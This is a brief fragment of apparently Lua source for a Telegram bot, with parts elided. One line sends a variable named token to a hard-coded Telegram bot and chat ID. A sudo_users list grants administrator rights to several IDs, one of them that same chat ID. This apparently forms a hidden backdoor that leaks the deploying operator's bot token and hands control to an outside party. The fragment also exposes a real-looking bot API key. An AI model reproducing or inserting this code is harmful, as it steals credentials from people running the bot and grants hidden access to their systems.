...
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1851380322&text=' ..token)
end 
else
...
sudo_users = {SUDO,1814415004,1335307516,1851380322}   
